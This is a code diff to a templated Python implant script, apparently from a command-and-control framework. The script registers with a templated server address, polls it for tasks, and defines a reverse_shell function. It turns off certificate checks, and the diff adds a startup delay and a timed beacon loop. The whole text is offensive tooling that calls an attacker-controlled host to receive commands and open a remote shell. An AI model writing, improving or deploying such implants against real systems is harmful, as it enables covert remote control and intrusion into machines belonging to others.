@@ -7,11 +7,12 @@ import time
 import requests as r
 import urllib3
 
+time.sleep({{delay}})
 {% if ssl %}
-URL = "https://{{host}}:{{port}}/stager"
+URL = "https://{{address}}:{{port}}/"
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 {% else %}
-URL = "http://{{host}}:{{port}}/stager"
+URL = "http://{{address}}:{{port}}/"
 {% endif %}
 
 def reverse_shell(address: str, port: int):
@@ -31,8 +32,8 @@ data = {
 }
 name = r.post(f"{URL}/connect", json=data, verify=False).text
 
-while True:
-    time.sleep(5)
+for _ in range({{timeout}}):
+    time.sleep({{sleep_time}})
     try:
         tasks = r.get(URL + "/tasks/" + name, verify=False)
     except:
